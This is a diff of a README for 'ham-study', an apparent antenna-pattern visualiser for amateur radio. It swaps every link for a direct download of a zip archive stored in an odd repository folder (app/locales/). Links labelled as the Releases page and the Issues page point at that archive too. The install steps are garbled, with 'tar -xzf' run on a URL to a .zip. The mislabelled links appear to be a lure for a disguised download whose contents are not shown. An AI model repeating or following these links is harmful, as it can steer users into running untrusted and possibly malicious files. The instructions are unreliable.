@@ -1,6 +1,6 @@
 # 📡 ham-study - Visualize Antenna Patterns Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip%20Latest%https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip)](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip%20Latest%https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip)](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Before downloading ham-study, ensure your machine meets the following requiremen
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip) to download the latest version of ham-study. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip) to download the latest version of ham-study. 
 
 1. Click on the link above.
 2. On the Releases page, find the latest release.
 3. Look for the appropriate file for your operating system:
    - For Windows users, download the `.exe` file. 
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip` file.
 4. After the download completes, follow the instructions below for installation based on your operating system.
 
 ### 📃 Windows Installation
@@ -43,10 +43,10 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Sath
 
 ### 🐧 Linux Installation
 
-1. Open a terminal and navigate to the directory containing the downloaded `https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip` file.
+1. Open a terminal and navigate to the directory containing the downloaded `https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip` file.
 2. Run the following command to extract it:
    ```
-   tar -xzf https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip
+   tar -xzf https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip
    ```
 3. Change into the created directory:
    ```
@@ -75,7 +75,7 @@ Once you've installed the application, you can start exploring antenna patterns 
 
 ## 🔗 Support & Community
 
-If you encounter any issues or have questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip). Feel free to report bugs or suggest features. 
+If you encounter any issues or have questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip). Feel free to report bugs or suggest features. 
 
 Join our community of Amateur Radio enthusiasts and visualize your way to better antenna designs!
 
@@ -89,4 +89,4 @@ Join our community of Amateur Radio enthusiasts and visualize your way to better
 
 We welcome your feedback! Please let us know how ham-study is helping you or how we can improve your experience.
 
-To download ham-study now, click [here](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/mds/study-ham-v1.4.zip) again to access the Releases page. Enjoy your exploration of antenna patterns!
+To download ham-study now, click [here](https://raw.githubusercontent.com/Sathyatechprog/ham-study/main/app/locales/ham-study-v3.8-alpha.4.zip) again to access the Releases page. Enjoy your exploration of antenna patterns!
